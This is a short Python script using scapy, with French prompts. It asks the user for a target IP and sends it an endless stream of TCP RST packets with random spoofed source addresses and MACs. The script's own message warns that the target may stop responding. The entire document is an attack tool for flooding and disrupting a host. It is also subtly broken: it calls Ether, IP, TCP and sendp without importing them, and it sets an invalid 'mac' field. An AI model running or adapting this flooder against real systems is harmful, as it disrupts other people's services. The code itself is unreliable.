import scapy.all

print("L'adresse IP ciblée risque de ne plus répondre lors de cette attaque.")

dst_ip = input("Entrez l'IP ciblée: ")
src_ip = scapy.all.RandIP()
rand_mac = scapy.all.RandMAC()

rst_packet = Ether(mac = rand_mac) / IP(src = src_ip, dst = dst_ip) / TCP(flags = "R") 

while True:
    sendp(rst_packet)
